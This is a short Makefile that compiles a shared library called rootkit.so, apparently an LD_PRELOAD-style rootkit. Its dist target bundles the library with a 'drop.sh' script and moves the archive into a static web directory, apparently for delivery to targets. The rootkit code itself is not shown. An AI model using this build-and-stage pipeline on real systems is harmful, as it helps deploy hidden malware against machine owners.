CC=gcc 
CFLAGS=-I. -D_GNU_SOURCE -fPIC
DEPS=constants.h
OBJ=rootkit.o
LIBNAME=rootkit.so

%.o: %.c $(DEPS)
	$(CC) -c -o $@ $< $(CFLAGS)

all: rootkit
rootkit: $(OBJ)
	$(CC) -o $(LIBNAME) $^ $(CFLAGS) -shared -ldl

dist:
	tar -czf rootkit.tz rootkit.so drop.sh
	[ -d "/home/ubuntu/static" ] && mv rootkit.tz /home/ubuntu/static

clean:
	rm *.o $(LIBNAME)
	rm rootkit.tz
